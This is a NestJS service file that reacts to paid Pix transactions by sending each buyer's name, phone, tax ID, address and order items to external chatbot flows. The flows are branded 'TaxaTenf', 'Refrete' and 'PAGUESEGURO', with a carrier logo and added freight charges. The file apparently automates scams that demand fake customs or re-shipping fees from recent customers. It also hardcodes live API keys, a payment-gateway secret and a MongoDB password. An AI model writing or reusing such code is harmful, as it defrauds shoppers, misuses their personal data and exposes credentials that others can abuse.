import { Injectable } from '@nestjs/common';
import { PrismaClient } from '@prisma/client';
var privateKey = "admin_live_YuTvvox0zgoqUVsNQLRQovZmS0BW1u"
import * as fs from 'fs'
import { InjectQueue } from 'agenda-nest';
import * as Agenda from 'agenda';
var MailChecker = require('mailchecker');

async function verifyEmailService(email) {
  
  const response = await fetch(`https://emailverifier.reoon.com/api/v1/verify?email=${email}&key=AdKu20js6MCizcx8qDLQOZxRUICuK5IT&mode=power`, {
    method: 'GET',
    redirect: 'follow'
  })
  const data = await response.json()
  return data

}

async function startFlowTypebotTENF(item, codigoRastreio) {
  var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

var raw = JSON.stringify({
  "prefilledVariables": {
    "clientEmail": item.customer.email,
    "clientName": item.customer.name,
    "clientPhone": item.customer.phone,
    "codigoRastreio": codigoRastreio,
    "cep": item.customer?.address?.zipCode || "70872050",
    "data": new Date().toLocaleDateString(),
   "logoUrl": `https://s3.rastreou.org/cod-rastreio/sas.png`,
    "horario": new Date().toLocaleTimeString(),
    "endereco": item.customer.address?.street,
    "state": item.customer.address?.state,
    "valor": (item.amount / 100).toString(),
    "frete": ((item.shipping?.amount / 100 || 0) + 17.98).toString(),
    "storeName": "TaxaTenf",
    "clientDocument": item.customer.document.number,
    "productsHtml": item.items.map((item) => {
      return `
      <tr>
<td style="border-collapse: collapse;"></td>
</tr>
<tr>
<td style="border-collapse: collapse; width: 75px;">
<img src="https://s3.rastreou.org/cod-rastreio/placeholder.png"
    style="width:50px; border: 2px solid; border-radius: 10px;">
</td>
<td style="border-collapse: collapse;">
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    <strong>
      ${item.title}
    </strong></p>
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    ${item.quantity} un. x R$&nbsp;${item.unitPrice/100}</p>
</td>
</tr>

<tr>
<td style="border-collapse: collapse;"></td>
</tr>
      `
    }).join("\n")
  },
  "isOnlyRegistering": false,
  "isStreamEnabled": false,
  "textBubbleContentFormat": "richText"
});
const resp = await fetch("https://typechat.ads-information.top/api/v1/typebots/taxa-tenf-no-payment-dtk74jr/startChat", {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
})
const data = await resp.json()
console.log(data)
if(resp.status == 200){
  return "ok"
}
throw new Error("Erro ao iniciar chat")

}

async function startFlowTypebotREFRETE(item, codigoRastreio) {
  var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

var raw = JSON.stringify({
  "prefilledVariables": {
    "clientEmail": item.customer.email,
    "clientName": item.customer.name,
    "clientPhone": item.customer.phone,
    "clientDocument": item.customer.document.number,
    "codigoRastreio": codigoRastreio,
    "cep": item.customer?.address?.zipCode || "70872050",
    "data": new Date().toLocaleDateString(),
    "logoUrl": `https://s3.rastreou.org/cod-rastreio/jadlog.png`,
    "horario": new Date().toLocaleTimeString(),
    "endereco": item.customer.address?.street,
    "state": item.customer.address?.state,
    "valor": (item.amount / 100).toString(),
    "frete": ((item.shipping?.amount / 100 || 0) + 27.99).toString(),
    "storeName": "Refrete",
    "productsHtml": item.items.map((item) => {
      return `
      <tr>
<td style="border-collapse: collapse;"></td>
</tr>
<tr>
<td style="border-collapse: collapse; width: 75px;">
<img src="https://s3.rastreou.org/cod-rastreio/placeholder.png"
    style="width:50px; border: 2px solid; border-radius: 10px;">
</td>
<td style="border-collapse: collapse;">
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    <strong>
      ${item.title}
    </strong></p>
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    ${item.quantity} un. x R$&nbsp;${item.unitPrice/100}</p>
</td>
</tr>

<tr>
<td style="border-collapse: collapse;"></td>
</tr>
      `
    }).join("\n")
  },
  "isOnlyRegistering": false,
  "isStreamEnabled": false,
  "textBubbleContentFormat": "richText"
});

const resp = await fetch("https://typechat.ads-information.top/api/v1/typebots/taxa-tenf-no-payment-7x6xv4s/startChat", {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
})
const data = await resp.json()
if(resp.status == 200){
  return "ok"
}
throw new Error("Erro ao iniciar chat")

}

async function startFlowTypebotRECUPERACAO(item, codigoRastreio) {
  var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

var raw = JSON.stringify({
  "prefilledVariables": {
    "clientEmail": item.customer.email,
    "clientName": item.customer.name,
    "clientPhone": item.customer.phone,
    "clientDocument": item.customer.document.number,
    "codigoRastreio": codigoRastreio,
    "cep": item.customer?.address?.zipCode || "70872050",
    "data": new Date().toLocaleDateString(),
    "logoUrl": `https://s3.rastreou.org/cod-rastreio/jadlog.png`,
    "horario": new Date().toLocaleTimeString(),
    "endereco": item.customer.address?.street,
    "state": item.customer.address?.state,
    "valor": (item.amount / 100).toString(),
    "frete": ((item.shipping?.amount / 100 || 0) + 27.99).toString(),
    "storeName": "PAGUESEGURO",
    "urlSecure": item.secureUrl,
    "productsHtml": item.items.map((item) => {
      return `
      <tr>
<td style="border-collapse: collapse;"></td>
</tr>
<tr>
<td style="border-collapse: collapse; width: 75px;">
<img src="https://s3.rastreou.org/cod-rastreio/placeholder.png"
    style="width:50px; border: 2px solid; border-radius: 10px;">
</td>
<td style="border-collapse: collapse;">
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    <strong>
      ${item.title}
    </strong></p>
<p
    style="font-size:14px;line-height:20px;margin-top:0;margin-bottom:0;color:#828282">
    ${item.quantity} un. x R$&nbsp;${item.unitPrice/100}</p>
</td>
</tr>

<tr>
<td style="border-collapse: collapse;"></td>
</tr>
      `
    }).join("\n")
  },
  "isOnlyRegistering": false,
  "isStreamEnabled": false,
  "textBubbleContentFormat": "richText"
});

const resp = await fetch("https://typechat.ads-information.top/api/v1/typebots/taxa-tenf-no-payment-7x6xv4s/startChat", {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
})
const data = await resp.json()
if(resp.status == 200){
  return "ok"
}
throw new Error("Erro ao iniciar chat")

}

async function createTransaction(dataT) {
  var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");
myHeaders.append("Authorization", "Basic c2tfbGl2ZV9XdUZIUWJJb0htQVpncElESG40WUJmcUdoakZPSU9GQzloRk5ReE8zT2E6eA==");
delete dataT.id
delete dataT.splits
 dataT.customer.id = undefined
dataT.items = dataT.items.map((item) => {
  // 10% de desconto
 return {
  ...item,
  unitPrice: item.unitPrice * 0.9
 }
})
dataT.amount = dataT.amount * 0.9
var raw = JSON.stringify(dataT)

const response = await fetch("https://api.gateway.cashtimepay.com.br/v1/transactions/", {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
})
const data = await response.json()
console.log(data)
return data
}

// @ts-ignore
var agenda = new Agenda({ db: { 
  // address: "mongodb://admin:%40Souumbbk1@185.209.230.133:27017/",
  // collection: 'newIntegration4',
  address: process.env.MONGO_URL,
  collection: 'TaxAgenda',
},
});

const prisma = new PrismaClient()
@Injectable()
export class AppService {
  constructor() {}
  async handle(body:any) {
    console.log("body", body.data.id)
    if(body.type == "transaction"){
      let data = body.data

      // sk_live_WuFHQbIoHmAZgpIDHn4YBfqGhjFOIOFC9hFNQxO3Oa
      // 85603290
      if(!data){
        console.log("Erro ao buscar transação")
        return
      }
      let isPhysical = data.items.some((item) => item.tangible)
      for (let item of data.items) {
        if (item.title && /^[0-9]+ Reais$/.test(item.title)) {
          return
        }
      }
      
      const isNight = new Date().getHours() >= 22 || new Date().getHours() <= 5
      // const isNight = false
      if(data.status == 'paid' && data.paymentMethod == 'pix'){
        if(await prisma.sents.findFirst({
          where: {
            transactionId: data.id.toString()
            }
            })){
              return
            }
            
        if(isNight){
          return await prisma.sentsPending.create({
            data: {
              data: body,
            }
          })
        }
        console.log("Iniciando chat")
        const email = data.customer.email

        const verifyEmail = async () => {
          if(email.split('@')[0].length <= 4) {
            return "Menos de 4 caracteres"
          }
          if(!MailChecker.isValid(email)){
            return "Email inválido"
          }
          if (email.split('@')[0].match(/\d{5,}$/)) {
            return "Mais de 5 números no final do email"
          }
          if (email.split('@')[0].match(/\d{7,}$/)) {
            return "Caracteres especiais no email"
          }
          if (email.split('@')[0].match(/.*\d.*\d.*\d.*\d.*\d.*\d.*\d.*/)) {
            return "Email contém mais de 7 números"
          }
          if((await verifyEmailService(email)).status != "safe"){
            return "ServiceNotSafe"
          }

          return null
        }
        // 
        if(await verifyEmail()){
          await prisma.emailRefused.create({
            data: {
              email: email,
              error: await verifyEmail()
            }
          })
          return
        }

        await startFlowTypebotTENF(data, data.id)
        // const transaction = await createTransaction(data)
        // await startFlowTypebotRECUPERACAO(transaction, data.id)

        if(isPhysical && data.customer?.address?.zipCode){
          // 3 dias
          // await agenda.schedule(
          //   new Date(Date.now() + 1000 * 60 * 60 * 24 * 3),
          //    'refrete', data)
          // await startFlowTypebotREFRETE(data, data.id)

        }
        await prisma.sents.create({
          data: {
            data: data,
            transactionId: data.id.toString()
          }
        })

      }

    }
  }
}
